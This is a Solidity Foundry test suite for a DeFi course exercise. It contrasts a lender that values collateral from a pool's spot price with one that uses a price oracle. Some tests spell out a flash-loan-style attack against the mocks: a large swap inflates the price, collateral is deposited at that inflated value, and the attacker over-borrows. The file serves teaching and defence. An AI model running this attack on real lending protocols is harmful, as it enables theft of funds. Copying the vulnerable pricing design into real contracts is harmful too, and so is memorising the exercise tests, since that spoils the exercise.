// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

// ============================================================================
//  DO NOT MODIFY THIS FILE — it is the test suite for the SpotPriceManipulation
//  exercise. Implement SpotPriceManipulation.sol to make these tests pass.
// ============================================================================

import "forge-std/Test.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {MockERC20} from "../../../../src/part2/module3/mocks/MockERC20.sol";
import {MockAggregatorV3} from "../../../../src/part2/module3/mocks/MockAggregatorV3.sol";
import {SimplePool} from "../../../../src/part2/module3/mocks/SimplePool.sol";
import {
    VulnerableLender,
    SafeLender,
    InsufficientCollateral,
    ZeroAmount
} from "../../../../src/part2/module3/exercise4-spot-price/SpotPriceManipulation.sol";

contract SpotPriceManipulationTest is Test {
    MockERC20 weth;
    MockERC20 usdc;
    SimplePool pool;
    MockAggregatorV3 ethOracle;

    VulnerableLender vulnerableLender;
    SafeLender safeLender;

    address liquidityProvider = makeAddr("lp");
    address attacker = makeAddr("attacker");
    address borrower = makeAddr("borrower");

    // Pool: 100 ETH + 300,000 USDC (ETH price = $3,000)
    uint256 constant INITIAL_ETH = 100e18;
    uint256 constant INITIAL_USDC = 300_000e18;
    uint256 constant ETH_PRICE_8DEC = 3000_00000000; // $3,000 with 8 decimals

    // Borrow reserves: lenders hold USDC for borrowers
    uint256 constant LENDER_USDC_RESERVES = 500_000e18;

    // Attacker's capital (simulates flash loan)
    uint256 constant ATTACKER_USDC = 600_000e18;    // Flash-borrowed USDC for pool manipulation
    uint256 constant ATTACKER_COLLATERAL = 10e18;    // 10 ETH to deposit as collateral

    uint256 constant MAX_STALENESS = 4500;

    function setUp() public {
        // Deploy tokens
        weth = new MockERC20("Wrapped ETH", "WETH", 18);
        usdc = new MockERC20("USD Coin", "USDC", 18);

        // Deploy pool
        pool = new SimplePool(address(weth), address(usdc));

        // Seed pool with initial liquidity
        weth.mint(liquidityProvider, INITIAL_ETH);
        usdc.mint(liquidityProvider, INITIAL_USDC);

        vm.startPrank(liquidityProvider);
        weth.approve(address(pool), type(uint256).max);
        usdc.approve(address(pool), type(uint256).max);
        pool.addLiquidity(INITIAL_ETH, INITIAL_USDC);
        vm.stopPrank();

        // Deploy oracle (ETH = $3,000, 8 decimals — matches real Chainlink ETH/USD)
        ethOracle = new MockAggregatorV3(int256(ETH_PRICE_8DEC), 8);

        // Deploy both lenders
        vulnerableLender = new VulnerableLender(address(pool));
        safeLender = new SafeLender(address(pool), address(ethOracle), MAX_STALENESS);

        // Fund lenders with USDC reserves (for borrowing)
        usdc.mint(address(vulnerableLender), LENDER_USDC_RESERVES);
        usdc.mint(address(safeLender), LENDER_USDC_RESERVES);

        // Give attacker capital:
        //   - USDC for manipulation (simulates flash-borrowed USDC)
        //   - WETH for collateral deposit
        usdc.mint(attacker, ATTACKER_USDC);
        weth.mint(attacker, ATTACKER_COLLATERAL);
    }

    // =========================================================
    //  Price Movement Verification
    // =========================================================

    function test_VulnerableLender_PriceMovesWithSwap() public {
        // Record spot price before
        uint256 priceBefore = pool.getSpotPrice();

        // Attacker swaps 600k USDC into pool → buys ETH → massively inflates ETH spot price
        // Pool goes from balanced (100 ETH + 300k USDC) to ETH-scarce
        vm.startPrank(attacker);
        usdc.approve(address(pool), ATTACKER_USDC);
        pool.swap(address(usdc), ATTACKER_USDC);
        vm.stopPrank();

        uint256 priceAfter = pool.getSpotPrice();

        // Spot price should have increased dramatically (less ETH, more USDC in reserves)
        assertGt(
            priceAfter,
            priceBefore,
            "Spot price should increase after large USDC buy (drains ETH from pool)"
        );

        // The vulnerable lender reads this manipulated price
        uint256 valueAfter = vulnerableLender.getCollateralValue(address(weth), 1e18);
        // Value uses the current (manipulated) reserves → hugely inflated
        assertGt(valueAfter, 0, "Collateral value should be positive");
    }

    function test_SafeLender_PriceUnchangedBySwap() public {
        // Record oracle value before
        uint256 valueBefore = safeLender.getCollateralValue(address(weth), 1e18);

        // Same large swap
        vm.startPrank(attacker);
        usdc.approve(address(pool), ATTACKER_USDC);
        pool.swap(address(usdc), ATTACKER_USDC);
        vm.stopPrank();

        // Oracle value unchanged — Chainlink doesn't react to DEX swaps
        uint256 valueAfter = safeLender.getCollateralValue(address(weth), 1e18);

        assertEq(
            valueBefore,
            valueAfter,
            "Oracle-based valuation must NOT change when someone swaps in a DEX pool"
        );
    }

    // =========================================================
    //  THE CORE ATTACK
    // =========================================================

    function test_SpotPriceManipulation_Attack() public {
        // This test demonstrates the full spot price manipulation attack.
        //
        // The attacker:
        //   1. Has 600k USDC (simulating a flash loan — zero cost in practice)
        //   2. Swaps USDC into pool → buys ETH → inflates ETH spot price
        //   3. Deposits 10 ETH as collateral at the inflated valuation
        //   4. Borrows USDC far exceeding the collateral's true value
        //
        // True value of 10 ETH = 10 * $3,000 = $30,000
        // After manipulation, the VulnerableLender thinks 10 ETH is worth much more.

        uint256 trueValueOf10ETH = 10e18 * INITIAL_USDC / INITIAL_ETH; // $30,000

        vm.startPrank(attacker);
        usdc.approve(address(pool), type(uint256).max);
        weth.approve(address(vulnerableLender), type(uint256).max);

        // Step 1: Swap 600k USDC into pool to inflate ETH spot price
        pool.swap(address(usdc), ATTACKER_USDC);

        // Step 2: Deposit 10 ETH as collateral at inflated price
        vulnerableLender.deposit(address(weth), ATTACKER_COLLATERAL);

        // Step 3: Check how much the lender thinks the collateral is worth
        uint256 recordedValue = vulnerableLender.collateralValue(attacker);

        // The recorded value should be MUCH more than the true value
        assertGt(
            recordedValue,
            trueValueOf10ETH,
            "EXPLOIT: Vulnerable lender recorded inflated collateral value"
        );

        // Step 4: Borrow based on the inflated value
        // Borrow the true value — the fact that we CAN borrow this much
        // when the actual collateral is worth the same amount means the
        // excess is pure profit from the manipulation
        uint256 borrowAmount = trueValueOf10ETH;
        vulnerableLender.borrow(address(usdc), borrowAmount);

        // Attacker now holds the borrowed USDC
        // (attacker's original USDC was all swapped into the pool, so balance = borrow only)
        assertEq(
            usdc.balanceOf(attacker),
            borrowAmount,
            "Attacker should have received borrowed USDC"
        );

        vm.stopPrank();

        // The attacker could borrow even MORE (up to recordedValue),
        // because the lender thinks the collateral is worth that much.
        // The excess borrowing capacity (recordedValue - trueValueOf10ETH)
        // represents the profit from the manipulation.
        assertGt(
            recordedValue - trueValueOf10ETH,
            0,
            "EXPLOIT: Excess borrowing capacity = attacker profit from manipulation"
        );
    }

    function test_SafeLender_ResistsManipulation() public {
        // Same attack sequence against SafeLender — should not produce excess value.

        uint256 trueValueOf10ETH = 10e18 * 3000e18 / 1e18; // Oracle says $3,000/ETH

        vm.startPrank(attacker);
        usdc.approve(address(pool), type(uint256).max);
        weth.approve(address(safeLender), type(uint256).max);

        // Step 1: Swap to manipulate pool spot price
        pool.swap(address(usdc), ATTACKER_USDC);

        // Step 2: Deposit 10 ETH — SafeLender uses oracle price, not spot
        safeLender.deposit(address(weth), ATTACKER_COLLATERAL);

        // Step 3: Check recorded value — should reflect oracle price, not spot
        uint256 recordedValue = safeLender.collateralValue(attacker);

        // The recorded value should be close to the true value (oracle-based)
        assertApproxEqRel(
            recordedValue,
            trueValueOf10ETH,
            1e15, // 0.1% tolerance for rounding
            "DEFENSE: SafeLender records true collateral value regardless of pool state"
        );

        // Step 4: Can only borrow up to the true value
        // Attempting to borrow more should fail
        vm.expectRevert(InsufficientCollateral.selector);
        safeLender.borrow(address(usdc), trueValueOf10ETH + 1);

        vm.stopPrank();
    }

    function test_VulnerableVsSafe_ProfitComparison() public {
        // Side-by-side comparison: same collateral, same pool manipulation,
        // different valuation sources.

        vm.startPrank(attacker);
        usdc.approve(address(pool), type(uint256).max);
        weth.approve(address(vulnerableLender), type(uint256).max);
        weth.approve(address(safeLender), type(uint256).max);

        // Manipulate pool price
        pool.swap(address(usdc), ATTACKER_USDC);

        // Deposit same amount to both lenders
        vulnerableLender.deposit(address(weth), ATTACKER_COLLATERAL / 2);
        safeLender.deposit(address(weth), ATTACKER_COLLATERAL / 2);

        uint256 vulnerableValue = vulnerableLender.collateralValue(attacker);
        uint256 safeValue = safeLender.collateralValue(attacker);

        vm.stopPrank();

        // Vulnerable lender should show inflated value
        // Safe lender should show true value
        assertGt(
            vulnerableValue,
            safeValue,
            "Vulnerable lender should report higher value than safe lender during manipulation"
        );
    }

    // =========================================================
    //  Basic Operations
    // =========================================================

    function test_Deposit_RecordsCorrectValue() public {
        // Without manipulation, both lenders should agree roughly
        weth.mint(borrower, 10e18);

        vm.startPrank(borrower);
        weth.approve(address(vulnerableLender), 10e18);
        vulnerableLender.deposit(address(weth), 10e18);
        vm.stopPrank();

        uint256 recorded = vulnerableLender.collateralValue(borrower);
        assertGt(recorded, 0, "Deposited collateral should have positive value");
    }

    function test_Borrow_InsufficientCollateral_Reverts() public {
        weth.mint(borrower, 1e18);

        vm.startPrank(borrower);
        weth.approve(address(vulnerableLender), 1e18);
        vulnerableLender.deposit(address(weth), 1e18);

        // Try to borrow more than collateral value
        uint256 collValue = vulnerableLender.collateralValue(borrower);
        vm.expectRevert(InsufficientCollateral.selector);
        vulnerableLender.borrow(address(usdc), collValue + 1);
        vm.stopPrank();
    }

    function test_ZeroAmount_Reverts() public {
        vm.prank(borrower);
        vm.expectRevert(ZeroAmount.selector);
        vulnerableLender.deposit(address(weth), 0);

        vm.prank(borrower);
        vm.expectRevert(ZeroAmount.selector);
        vulnerableLender.borrow(address(usdc), 0);
    }
}
